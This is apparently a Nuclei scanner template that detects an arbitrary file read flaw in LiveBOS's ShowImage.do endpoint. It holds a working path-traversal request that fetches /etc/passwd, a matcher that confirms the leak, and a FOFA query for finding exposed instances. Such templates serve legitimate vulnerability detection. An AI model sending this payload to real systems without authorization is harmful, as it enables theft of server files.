http:
- matchers:
  - condition: and
    dsl:
    - contains(body_1, "Power by LiveBOS")
    - regex('root:.*:0', body_2)
    - status_code_2 == 200
    type: dsl
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
  - 'GET /feed/ShowImage.do;.js.jsp?type=&imgName=../../../../../../../../../../../../../../../etc/passwd
    HTTP/1.1

    Host: {{Hostname}}

    '
id: livebos-file-read
info:
  author: yusakie
  description: 'An arbitrary file read vulnerability exists in the LiveBOS ShowImage.do
    interface, which can be exploited to obtain sensitive files from the server.

    '
  metadata:
    fofa-query: "app=\"LiveBOS-\u6846\u67B6\" && body=\"\u7BA1\u7406\u63A7\u5236\u53F0\
      \""
    max-request: 2
    verified: 'true'
  name: LiveBOS ShowImage.do - Arbitrary File Read
  reference:
  - https://www.wevul.com/2301.html
  severity: high
  tags: livebos,lfi,vuln
